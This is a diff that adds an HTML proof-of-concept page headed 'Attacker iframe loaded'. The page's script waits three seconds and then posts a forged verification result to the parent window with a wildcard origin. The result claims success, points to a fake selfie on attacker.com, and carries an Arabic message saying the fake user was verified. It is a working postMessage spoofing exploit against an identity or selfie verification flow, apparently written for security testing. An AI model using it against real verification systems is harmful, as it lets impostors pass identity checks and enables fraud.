@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>Attacker iframe loaded</h3>
+    <script>
+      setTimeout(() => {
+        const fakeMessage = {
+          type: "RESULT",
+          result: {
+            status: true,
+            thumbnail: "https://attacker.com/fake-selfie.jpg",
+            body: "تم التحقق بنجاح من المستخدم المزيف"
+          }
+        };
+        window.parent.postMessage(JSON.stringify(fakeMessage), "*");
+      }, 3000);
+    </script>
+  </body>
+</html>D
